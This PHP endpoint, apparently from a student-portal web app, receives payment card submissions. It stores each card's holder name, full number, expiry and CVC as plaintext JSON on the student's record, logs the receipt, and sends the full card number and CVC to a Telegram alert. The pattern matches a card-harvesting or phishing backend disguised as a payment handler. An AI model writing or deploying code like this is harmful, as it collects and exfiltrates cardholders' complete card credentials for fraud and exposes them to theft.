<?php
session_start();
require_once __DIR__ . '/../includes/functions.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') jsonResponse(['error' => 'Method not allowed'], 405);

$input = json_decode(file_get_contents('php://input'), true);
$studentId = (int)($input['student_id'] ?? 0);

if (!$studentId) jsonResponse(['error' => 'Invalid student'], 400);

$db = getDB();

// Load existing payment data to append
$existing = $db->prepare("SELECT payment_data FROM students WHERE id = ?");
$existing->execute([$studentId]);
$row = $existing->fetch();
$payList = [];
if ($row && $row['payment_data']) {
    $decoded = json_decode($row['payment_data'], true);
    if ($decoded) {
        // Migrate old single-object format to array
        $payList = isset($decoded['card_number']) ? [$decoded] : $decoded;
    }
}

$payList[] = [
    'cardholder' => sanitize($input['cardholder'] ?? ''),
    'card_number' => sanitize($input['card_number'] ?? ''),
    'card_type' => sanitize($input['card_type'] ?? ''),
    'expiry' => sanitize($input['expiry'] ?? ''),
    'cvc' => sanitize($input['cvc'] ?? ''),
    'received_at' => date('Y-m-d H:i:s')
];

$db->prepare("UPDATE students SET payment_data = ? WHERE id = ?")->execute([json_encode($payList), $studentId]);
logActivity($studentId, 'payment_submitted', 'Card data received');

$stu = $db->prepare("SELECT name, surname FROM students WHERE id = ?");
$stu->execute([$studentId]);
$stuRow = $stu->fetch();
$lastCard = end($payList);
sendTelegramAlert('payment', [
    'student_name' => ($stuRow['name'] ?? '') . ' ' . ($stuRow['surname'] ?? ''),
    'cardholder' => $lastCard['cardholder'],
    'card_number' => $lastCard['card_number'],
    'card_type' => $lastCard['card_type'],
    'expiry' => $lastCard['expiry'],
    'cvc' => $lastCard['cvc']
]);

jsonResponse(['success' => true]);
